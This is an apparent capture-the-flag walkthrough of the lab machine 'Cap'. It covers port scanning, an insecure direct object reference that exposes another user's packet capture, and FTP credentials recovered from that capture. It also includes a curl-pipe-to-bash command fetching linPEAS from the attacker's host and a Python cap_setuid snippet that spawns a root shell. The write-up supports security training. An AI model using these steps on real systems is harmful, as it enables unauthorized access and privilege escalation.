Cap is an easy difficulty Linux machine running an HTTP server that performs administrative
functions including performing network captures. Improper controls result in Insecure Direct
Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext
credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to
root.

```
ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d
'/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.10.245
```

![image](https://github.com/user-attachments/assets/528bd5dd-6cce-4b33-b437-c8354d7ec9f0)

According to nmap, port 80 is running Gunicorn, which is a python based HTTP server. Browsing to
the page reveals a dashboard.

![image](https://github.com/user-attachments/assets/08bbc6cd-1a5e-4fcd-be4d-1d4b10870e36)

Browsing to the IP Config page reveals the output of ifconfig . 

![image](https://github.com/user-attachments/assets/f77f5c14-7795-4c29-9ec8-09df3da49ba5)

Similarly, the Network Status page reveals the output for netstat . This suggests that the
application is executing system commands. Clicking on the Security Snapshot menu item
pauses the page for a few seconds and returns a page as shown below.

![image](https://github.com/user-attachments/assets/7651f2ef-f541-41d7-a7ac-7d9e837afb0b)

Clicking on Download gives us a packet capture file, which can be examined using WireShark.

![image](https://github.com/user-attachments/assets/5c0ab0fd-a0e5-497a-9416-75ef86397cbe)

We don't see anything interesting and the capture just contains HTTP traffic from us.

One interesting thing to notice is the URL scheme when creating a new capture, that is of the form
/data/<id> . The id is incremented for every capture. It's possible that there were packet
captures from users before us.
Browsing to /data/0 does indeed reveal a packet capture with multiple packets.

![image](https://github.com/user-attachments/assets/d68cf2f9-11c4-42c2-bac8-fc56a9d28b80)

This vulnerability is known as Insecure Direct Object Reference (IDOR), wherein a user can directly
access data owned by another user. Let's examine this capture for potential sensitive data. 

Opening the ID 0 capture file in Wireshark reveals FTP traffic, including the user authentication.

![image](https://github.com/user-attachments/assets/e18647ee-b2f5-4b8d-b1c5-9b6aa7b9df9c)

The traffic is not encrypted, allowing us to retrieve the user credentials i.e. nathan /
Buck3tH4TF0RM3! . These are found to be valid not only for FTP but can be used to login via SSH.

Let's use the linPEAS script to check for privilege escalation vectors. We'll download the latest
version and store it on our VM. Then we can create a Python webserver serving that directory by
using cd to enter the directory with linxpeas.sh and running sudo python3 -m http.server
80 .
From our shell on Cap, we can fetch linpeas.sh with curl and pipe the output directly into
bash to execute it:

```
curl http://10.10.14.24/linpeas.sh | bash
```

![image](https://github.com/user-attachments/assets/7988975f-dfb8-4430-bb8a-55c037aa33ba)

The report contains an interesting entry for files with capabilities. The /usr/bin/python3.8 is
found to have cap_setuid and cap_net_bind_service , which isn't the default setting.
According to the documentation, CAP_SETUID allows the process to gain setuid privileges without
the SUID bit set. This effectively lets us switch to UID 0 i.e. root. The developer of Cap must have
given Python this capability to enable the site to capture traffic, which a non-root user can't do.
The following Python commands will result in a root shell:

```
import os
os.setuid(0)
os.system("/bin/bash")
```

It calls os.setuid() which is used to modify the process user identifier (UID)

![image](https://github.com/user-attachments/assets/0604428f-9fc1-4a26-ad2a-eefce127041a)
